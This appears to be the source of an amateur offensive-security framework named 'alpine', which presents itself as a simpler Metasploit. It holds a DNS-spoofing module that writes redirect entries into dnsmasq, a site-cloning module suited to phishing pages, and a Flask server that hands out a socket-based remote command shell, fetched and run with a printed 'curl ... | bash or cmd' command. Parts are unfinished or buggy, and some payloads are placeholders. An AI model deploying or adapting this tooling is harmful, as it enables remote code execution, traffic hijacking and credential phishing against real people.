from tkinter import E

import flask
import modules.plugin as plugin
from os import system
import threading
import logging
from time import sleep
from concurrent.futures import ThreadPoolExecutor
import ctypes
import multiprocessing

log = logging.getLogger('werkzeug')
log.disabled = True

class colors:
    """
    Module made by @venaxyt on Github
    https://github.com/venaxyt/gratient
    """
    def sunset(text):
        system(""); faded = ""
        for line in text.splitlines():
            red = 0
            green = 0
            blue = 255
            for character in line:
                if not green > 200:
                    green += 3
                    red += 6
                    blue -= 4
                faded += (f"\033[38;2;{red};{green};{blue}m{character}\033[0m")
            faded += "\n"
        return faded

class essensials:
    def sanitized_input(string, q=False):
        """
        sanitized input to use
        """
        try:
            a = str(input(string))
        except:
            if q: sysVar.rsSite = False; print("\nctrl+c"); quit()
            else: return False
        return a

    def closeThread(thread):
        try:
            thread.exit()
            return True
        except:
            return False

class EndpointAction(object):
    """
    https://stackoverflow.com/questions/40460846/using-flask-inside-class

    line 74
    """

    def __init__(self, action, send="no"):
            
        self.action = action
        self.response = send

    def __call__(self, send="ok"):
        self.action()
        return self.response


class FlaskAppWrapper(object):
    """
    https://stackoverflow.com/questions/40460846/using-flask-inside-class

    i edited it and only god knows how it works
    """
    app = None

    def __init__(self, name):
        try:
            from flask import Flask, request
        except ImportError:
            print("[!] flask needed for this")
            return
            
        self.app = Flask(name)
        self.req = request
        self.flsk = Flask

    def shutdown(self):
        if sysVar.rsSite:
            if sysVar.rsAllow:
                sysVar.rsSite = not sysVar.rsSite
                print("[!!!] this will be depreciated eventually and i am working on a fix [!!!]")
                func = self.req.environ.get('werkzeug.server.shutdown')
                #func = sel
                if func is None:
                    raise RuntimeError('Not running with the Werkzeug Server')
                func()
            else:
                return
        else:
            return

    def run(self, port, ip):
        self.app.add_url_rule("/shutdown", "shutdown", EndpointAction(self.shutdown, send="ok"))
        try:
            self.app.run(ip, port=port, debug=False, use_reloader=False)
        except RuntimeError:
            pass

    def add_endpoint(self, endpoint=None, endpoint_name=None, handler=None, send="ok"):
        self.app.add_url_rule(endpoint, endpoint_name, EndpointAction(handler, send=handler()))

class modules:
    """
    built in scripts and stuff
    """
    class reverse_shell:
        def flaskThread(a, ip, port:int):
            process = threading.Thread(target=a.run, args=(port, ip,), daemon=True)
            process.start()


        def linux():
            """
            flask download handler
            """
            return """
curl parrot.live
            """

        def windows():
            """
            flask download handler
            """
            return """
@echo off

curl parrot.live
            """

        def script():
            """
            python script
            """

            # temporary
            script = """
import socket
from subprocess import getoutput

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

skt.bind(("0.0.0.0", int(5354)))

skt.listen()

while True:
    conn, addr = skt.connect()

    with conn:
        while True:
            data = conn.recv(65536)

            if not data:
                break

            conn.sendall(getoutput(data).encode('utf-8'))
            """

            return script

        def initDownload(args:list):
            """
            execute the download server for quick execution/injection
            """

            try:
                ip = args[1]
                port = args[2]
            except:
                print("not enough args")
                return

            try:
                from httpx import get, RemoteProtocolError
            except ImportError:
                print("[!] httpx needed for this")
                return

            if sysVar.rsSite == True:
                if input("[!] flask server already running; close it? [Y/n]").lower() == "y":
                    sysVar.rsAllow = True

                    sleep(0.5)

                    try:
                        get("http://127.0.0.1:{}/shutdown".format(port), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"})
                    except RemoteProtocolError:
                        pass

                    sleep(0.5)

                    print("[-] closed site")
                    sysVar.rsAllow = False
                    return
                else:
                    return
                
            a = FlaskAppWrapper('wrap')
            a.add_endpoint(endpoint='/', endpoint_name='script', handler=modules.reverse_shell.script)
            a.add_endpoint(endpoint='/linux', endpoint_name='linux', handler=modules.reverse_shell.linux)
            a.add_endpoint(endpoint='/windows', endpoint_name='windows', handler=modules.reverse_shell.windows)
            #a.add_endpoint(endpoint='/shutdown', endpoint_name='shutdown', handler=modules.reverse_shell.shutdown)

            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/(linux or windows) | (bash or cmd)\" to run script".format("0.0.0.0", "80")) 

            sysVar.rsSite = True
            
            threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start()

            sleep(1)

        def initSocket(args:list):
            """
            main TCP socket client
            """

            try:
                import socket
            except ImportError:
                print("[!] socket(s) required for this")

            mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # generate tcp socket

            mainSock.bind((args[1], int(args[2])))

            mainSock.listen()

            while True:
                conn, addr =  mainSock.connect()

                with conn:
                    conn.sendall("test".encode('ascii'))

            
    class dns:
        def start(args:list):
            try:
                import os
            except ImportError:
                print("[!] unable to import os")
            
            a = essensials.sanitized_input("[?] this plugin requires DNSMasq and runs it's daemon, confirm? [Y/n]").lower()

            if a == "y":
                os.system("systemctl start dnsmasq")
                print("[!] started")
                return True
            else:
                print("[X] skipped")
                return False

        def add_entry(args:list):
            file_data = None

            try:
                domain = args[1]
                ip = args[2]
            except IndexError:
                print("[!] not enough args; dns-entry (domain) (server redirect ip)")
                return False

            try:
                with open("/etc/dnsmasq.conf", "r") as f:
                    file_data = f.read().split("\n")
            except FileNotFoundError:
                print("[!] /etc/dnsmasq.conf not found!")
                return

            if "address {}/{}\n".format(domain, ip) in file_data: #sanity check
                print("[!] entry already added!")
                return
            
            try:
                with open("/etc/dnsmasq.conf", "a") as f:
                    f.write("address {}/{}\n".format(domain, ip))
                    f.flush()
            except FileNotFoundError:
                print("[!] /etc/dnsmasq.conf not found!")
                return

            print("[+] DNS entry added")

    class clone:
        def cloneSite(args:list):
            try:
                import httpx
            except ImportError: # httpx not available
                print("[!] HTTPX needed for this module; pip install httpx")
                return

            if args[3] != "0": # if proxy given
                proxy = {"http": args[3].split(":")} # set our proxy to that
            else:
                proxy = {} # empty

            try:
                with open(args[2], "w", encoding='utf-8') as f:
                    f.write(httpx.get(args[1], headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}, proxies=proxy).text) # make the request and instantly write to file
                    f.flush() # flush just in case
                print("success")
                return
            except IndexError: # VVVVVVV
                print("[!] not enough arguments; replicate (url) (output file) (proxy (0 for none))")

class sysVar:
    """
    system variables
    """
    modules = { # built in modules
        "dns": {
            "module": modules.dns.start,
            "help": "start DNSmasq daemon"
        },

        "dns-entry": {
            "module": modules.dns.add_entry,
            "help": "add a dns entry to the dns server"
        },

        "cloneSite": {
            "module": modules.clone.cloneSite,
            "help": "download a site's HTML"
        },

        "rs-download": {
            "module": modules.reverse_shell.initDownload,
            "help": "start http flask server to download file from"
        },

        "rs-socket": {
            "module": modules.reverse_shell.initSocket,
            "help": "probe to client ip and attempt to connect"
        },
    }

    runnable_plugins = []
    rsSite = False
    rsAllow = False # allow shutdown
    activeThreads = []

if __name__ == "__main__":
    plugins = plugin.load(folder="modules") # load

    print(colors.sunset(r"""
                ___                                  
               /\_ \            __                   
           __  \//\ \    _____ /\_\    ___      __   
         /'__`\  \ \ \  /\ '__`\/\ \ /' _ `\  /'__`\ 
        /\ \L\.\_ \_\ \_\ \ \L\ \ \ \/\ \/\ \/\  __/ 
        \ \__/.\_\/\____\\ \ ,__/\ \_\ \_\ \_\ \____\
         \/__/\/_/\/____/ \ \ \/  \/_/\/_/\/_/\/____/
                           \ \_\                     
                            \/_/                     

    a more user friendly (but worse) version of metasploit
    """))

    for p in plugins[1]: # for plugin in plugins list
        for executable in plugins[1][p][1][0]: # for every executable in the plugin's executable list
            sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])] = {} # create dict

            try:
                sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["help"] = plugins[1][p][1][1][executable].strip() # define help
            except KeyError: # command's help not in configurationfile
                raise KeyError("\"{}\"'s command \"{}\" doesn't have a help key pair in it's configuration".format(plugins[1][p][0], executable))
            sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["module"] = None # set module as None to show it's not ours

    while True:
        c = essensials.sanitized_input("\nalpine#> ", q=True) # q=True to quit if ctrl+c

        if c == "help":
            for module in sysVar.modules: # cycle through each
                a = sysVar.modules[module]['help'] # get all help from modules
                print(f"{module}: {a}")
                continue # go back to input

        try:
            sysVar.modules[c.split(" ")[0]]["module"](c.split(" ")) # try getting it from built in modules
        except KeyError: # if not in modules:
            for p in plugins[1]: # for plugin in plugins list
                for executable in plugins[1][p][1][0]: # for every executable in the plugin's executable list
                    if c.split(' ')[0] == executable: # if our choice in plugin's executable path

                        try: # dont even know about this try except
                            plugin.function(c.split(' ')[0], c.split(' '), plugin=plugins[1][p][2]) # execute
                            # args:
                            # 1: the command / our choice, now being used to get the function
                            # 2: the args of the command
                            # 3: module to pull the function from
                        except:
                            raise # raise if error (no point)
